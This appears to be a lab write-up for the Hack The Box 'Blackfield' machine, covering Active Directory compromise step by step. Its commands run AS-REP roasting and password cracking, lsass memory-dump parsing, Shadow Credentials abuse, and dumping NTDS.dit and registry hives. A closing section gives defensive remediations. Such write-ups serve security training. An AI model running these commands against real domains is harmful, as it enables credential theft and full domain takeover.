## Recon

Quick TCP sweep with `nmap`:

```bash Terminal
nmap -sC -sV -oN nmap/initial 10.10.10.192
```

### SMB null bind

```bash Terminal
smbclient -N -L //10.10.10.192/
```

The `profiles$` share is world-readable and contains a folder per domain user. Instant user list.

```bash Extract usernames
smbclient -N //10.10.10.192/profiles$ -c 'recurse ON; ls' \
  | awk '{print $1}' | grep -v '^\.' > users.txt
```

## Foothold: AS-REP roast

<Warning>
  Accounts flagged with `DONT_REQ_PREAUTH` will emit an AS-REP encrypted with the user's key. That's a crackable hash.
</Warning>

```bash Terminal
GetNPUsers.py blackfield.local/ -usersfile users.txt \
  -no-pass -dc-ip 10.10.10.192 -format hashcat
```

```text
$krb5asrep$23$support@BLACKFIELD.LOCAL:8c...redacted...ce
```

Crack it:

```bash hashcat
hashcat -m 18200 support.hash rockyou.txt
# support:#00^BlackKnight
```

<Tip>
  Always try `--userdb` with mode 18200 first. AS-REP roastable accounts are usually service accounts with weak passwords.
</Tip>

## Lateral: forensic share

Authenticated SMB reveals a `forensic` share with a memory dump (`lsass.zip`). Pull it, unzip, and:

```bash pypykatz
pypykatz lsa minidump lsass.DMP | grep -A2 NT
```

Extract `audit2020` NTLM hash and pivot with `evil-winrm` after abusing `GenericWrite`:

```bash Shadow Credentials
certipy shadow auto -u audit2020@blackfield.local -hashes :<NT> \
  -account svc_backup
```

## Root: SeBackupPrivilege

`svc_backup` holds `SeBackupPrivilege`. Ship the registry hives out, extract NTDS, own the domain.

```powershell Backup NTDS
reg save HKLM\SYSTEM C:\Temp\system.hive
reg save HKLM\SAM C:\Temp\sam.hive
diskshadow.exe /s script.txt
robocopy /b Z:\Windows\NTDS C:\Temp NTDS.dit
```

```bash secretsdump
secretsdump.py -ntds NTDS.dit -system system.hive LOCAL
```

Pass-the-Hash as `Administrator`:

```bash psexec
psexec.py -hashes :<NT> administrator@10.10.10.192
```

## Defensive notes

- Disable `DONT_REQ_PREAUTH` on every account that doesn't need it.
- Restrict `profiles$` to authenticated users at minimum.
- Alert on `SeBackupPrivilege` usage from non-Tier 0 hosts.
- Rotate `krbtgt` twice after any full-domain compromise.
